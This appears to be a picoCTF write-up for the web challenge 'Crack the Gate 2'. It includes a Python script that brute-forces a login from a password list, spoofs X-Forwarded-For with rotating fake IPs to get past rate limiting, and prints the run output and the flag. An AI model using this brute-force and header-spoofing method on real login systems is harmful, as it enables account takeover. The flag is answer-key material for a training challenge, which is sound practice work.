# Crack the Gate 2

<img width="926" height="659" alt="image" src="https://github.com/user-attachments/assets/20373db0-be20-4d5e-ab09-fd62efa4d1d9" />

**Tag:** `Web Exploitation`

**Description:** 
>The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret. The website is running here. Can you try to log in?. Download the passwords list here.

**Attachments:** `http://amiable-citadel.picoctf.net:57426/` `passwords.txt`

**Hints:**

<details>
<summary>Hint 1</summary>

What IP does the server think you’re coming from?

</details>

<details>
<summary>Hint 2</summary>
  
Read more about X-forwarded-For

</details>

</details>

<details>
<summary>Hint 3</summary>
  
You can rotate fake IPs to bypass rate limits.

</details>

**Author:** Yahaya Meddy

**Solved:** `791 users solved`

---

# Solution

<img width="1000" height="500" alt="image" src="https://github.com/user-attachments/assets/888e86ff-4756-4977-8937-2591afb78c03" />

Just like before, a login UI is provided with an email and password form again. but what's different this time is that we have to make the server think that we are coming from another IP. and we are also given a list of passwords that are used to enter the dashboard perhaps. for that we can make a solver like the following


```python
import requests

url = "http://amiable-citadel.picoctf.net:57426//login"
email = "ctf-player@picoctf.org"

with open('passwords.txt', 'r') as pw:
    passwords = [password_line.strip() for password_line in pw]

for idx, password in enumerate(passwords):
    fake_ip = f"123.45.67.{idx}"
    headers = {"X-Forwarded-For": fake_ip}
    data = {"email": email, "password": password}

    r = requests.post(url, 
                    data=data, 
                    headers=headers, 
                    allow_redirects=False)
    if r.status_code == 302 or "picoCTF" in r.text:
        print(f"Password Hitted -> {password} -> result: {r.text}")
    else:
        print(f"{fake_ip} -> {email}:{password} failed ")
```

In this code, I created a fake IP loop, which is used to trick the server into thinking we're coming from a different IP. For this, we also use X-Forwarded-For. Next, as usual, we enter the credentials and password using the password list provided earlier.

then run the script and get the flag

```bash
 zsh > python solve.py
123.45.67.0 -> ctf-player@picoctf.org:FvQqRDID failed 
123.45.67.1 -> ctf-player@picoctf.org:o28yxJnz failed 
123.45.67.2 -> ctf-player@picoctf.org:dzXLq6iI failed 
123.45.67.3 -> ctf-player@picoctf.org:gQwoROCU failed 
123.45.67.4 -> ctf-player@picoctf.org:TqdQCjNn failed 
123.45.67.5 -> ctf-player@picoctf.org:VJSDcyso failed 
123.45.67.6 -> ctf-player@picoctf.org:wCLZCkww failed 
123.45.67.7 -> ctf-player@picoctf.org:GxjOadW5 failed 
123.45.67.8 -> ctf-player@picoctf.org:3pcv6C7j failed 
123.45.67.9 -> ctf-player@picoctf.org:F0v4Jsmr failed 
123.45.67.10 -> ctf-player@picoctf.org:y9JoEDYm failed 
Password Hitted -> QKCdmMKy -> result: {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{xff_byp4ss_brut3_44b93275}"}
123.45.67.12 -> ctf-player@picoctf.org:fnW92UyB failed 
123.45.67.13 -> ctf-player@picoctf.org:eMy1d5JZ failed 
123.45.67.14 -> ctf-player@picoctf.org:eturI0N3 failed 
123.45.67.15 -> ctf-player@picoctf.org:pBT4eP6k failed 
123.45.67.16 -> ctf-player@picoctf.org:o1QeNZ3M failed 
123.45.67.17 -> ctf-player@picoctf.org:hdd1CWXH failed 
123.45.67.18 -> ctf-player@picoctf.org:R6flYmhD failed 
123.45.67.19 -> ctf-player@picoctf.org:cRdawYlr failed
```

---

# Flag: picoCTF{xff_byp4ss_brut3_44b93275}
